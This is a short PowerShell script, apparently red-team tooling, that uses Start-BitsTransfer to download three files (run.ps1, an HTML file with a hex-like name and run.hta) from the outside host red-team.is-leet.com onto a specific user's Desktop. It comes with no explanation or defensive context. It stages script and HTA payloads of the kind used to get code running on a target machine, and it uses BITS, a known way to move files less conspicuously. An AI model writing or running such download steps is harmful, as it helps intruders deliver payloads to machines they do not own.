
$url = 'http://red-team.is-leet.com/run.ps1'
$out = 'C:\Users\tonesoreng\Desktop\run.ps1'

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $out

$url = 'http://red-team.is-leet.com/564545774d444178.html '
$out = 'C:\Users\tonesoreng\Desktop\564545774d444178.html '

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $out

$url = 'http://red-team.is-leet.com/run.hta'
$out = 'C:\Users\tonesoreng\Desktop\run.hta'

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $out

##END BITS TRANSFER